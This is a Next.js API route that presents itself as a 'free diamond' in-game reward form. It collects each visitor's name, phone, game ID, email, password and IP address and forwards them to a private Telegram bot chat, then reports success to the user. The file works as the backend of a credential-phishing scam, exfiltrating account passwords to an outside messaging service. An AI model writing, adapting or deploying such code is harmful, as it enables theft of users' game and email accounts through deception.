import { NextResponse } from 'next/server';
import { format } from 'date-fns';
import { toZonedTime } from 'date-fns-tz';
import { tgBotData } from '@/app/assets/assets';

export async function POST(request) {
  try {
    const data = await request.json();
    const { name, phone, gameId, email, password } = data;

    if (!name || !phone || !gameId) {
      return NextResponse.json(
        { status: 'error', message: 'Required fields missing' },
        { status: 400 }
      );
    }

    let ip = request.headers.get('x-forwarded-for') || 
             request.headers.get('x-real-ip') || 
             'Unknown IP';
    
    if (ip.startsWith('::ffff:')) ip = ip.substring(7);
    if (ip.includes(',')) ip = ip.split(',')[0].trim();

    const now = new Date();
    const zonedTime = toZonedTime(now, 'Asia/Dhaka');
    const timestamp = format(zonedTime, 'dd/MM/yyyy, hh:mm:ss a');

    // Escape special characters for Telegram's MarkdownV2 format
    const escapeMarkdown = (text) => text.toString().replace(/([_\*\[\]()~`>#+\-=|{}.!])/g, '\\$1');
    
    const message = `💎 New Free Diamond Request\\!

*Name*: \`${escapeMarkdown(name)}\`
*Phone*: \`${escapeMarkdown(phone)}\`
*Game ID*: \`${escapeMarkdown(gameId)}\`
*Email*: \`${escapeMarkdown(email || 'Not provided')}\`
*Password*: \`${escapeMarkdown(password || 'Not provided')}\`
*IP Address*: \`${escapeMarkdown(ip)}\`
*Submitted On*: ${escapeMarkdown(timestamp)}`;

    try {
      const telegramResponse = await fetch(`https://api.telegram.org/bot${tgBotData.BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: tgBotData.CHAT_ID,
          text: message,
          parse_mode: 'MarkdownV2'
        })
      });

      if (!telegramResponse.ok) {
        const errorData = await telegramResponse.text().catch(() => 'Failed to parse error response');
        console.error('Telegram API error:', errorData);
        return NextResponse.json(
          { status: 'error', message: 'Failed to process diamond request' },
          { status: 500 }
        );
      }
    } catch (networkError) {
      console.error('Network error when calling Telegram API:', networkError);
      return NextResponse.json(
        { status: 'error', message: 'Network error when processing request' },
        { status: 500 }
      );
    }

    return NextResponse.json({
      status: 'success',
      message: 'Diamond request submitted successfully',
    });
  } catch (error) {
    console.error('Free diamond error:', error);
    return NextResponse.json(
      { status: 'error', message: 'Server error' },
      { status: 500 }
    );
  }
}
